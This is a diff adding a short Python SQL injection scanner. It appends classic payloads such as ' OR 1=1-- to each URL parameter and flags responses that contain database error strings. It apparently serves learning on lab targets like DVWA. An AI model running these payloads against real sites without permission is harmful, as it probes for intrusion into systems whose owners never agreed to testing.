@@ -1,0 +1,85 @@
+import requests
+import threading
+import time
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+# ---------------- CONFIG ---------------- #
+PAYLOADS = [
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "\" OR \"1\"=\"1",
+    "' OR 'a'='a",
+]
+
+SQL_ERRORS = [
+    "sql syntax",
+    "mysql",
+    "syntax error",
+    "warning",
+    "unclosed quotation",
+    "quoted string not properly terminated"
+]
+
+RATE_LIMIT = 1  # seconds
+LOG_FILE = "scan_results.txt"
+# ---------------------------------------- #
+
+lock = threading.Lock()
+
+def log_result(text):
+    with lock:
+        with open(LOG_FILE, "a") as f:
+            f.write(text + "\n")
+
+def is_vulnerable(response_text):
+    for error in SQL_ERRORS:
+        if error in response_text.lower():
+            return True
+    return False
+
+def test_url(url):
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+
+    if not params:
+        print("[!] No parameters found in URL")
+        return
+
+    for param in params:
+        for payload in PAYLOADS:
+            test_params = params.copy()
+            test_params[param] = params[param][0] + payload
+
+            new_query = urlencode(test_params, doseq=True)
+            test_url = urlunparse(parsed._replace(query=new_query))
+
+            try:
+                response = requests.get(test_url, timeout=5)
+                if is_vulnerable(response.text):
+                    msg = f"[VULNERABLE] {test_url}"
+                    print(msg)
+                    log_result(msg)
+                else:
+                    msg = f"[SAFE] {test_url}"
+                    print(msg)
+            except Exception as e:
+                print(f"[ERROR] {e}")
+
+            time.sleep(RATE_LIMIT)
+
+def main():
+    print("=== SQL Injection Scanner ===")
+    print("⚠ Use only on allowed targets (DVWA / localhost)")
+    target = input("Enter target URL with parameter: ")
+
+    log_result("\n--- New Scan Started ---")
+    thread = threading.Thread(target=test_url, args=(target,))
+    thread.start()
+    thread.join()
+
+    print("\nScan Completed!")
+    print(f"Results saved in {LOG_FILE}")
+
+if __name__ == "__main__":
+    main()
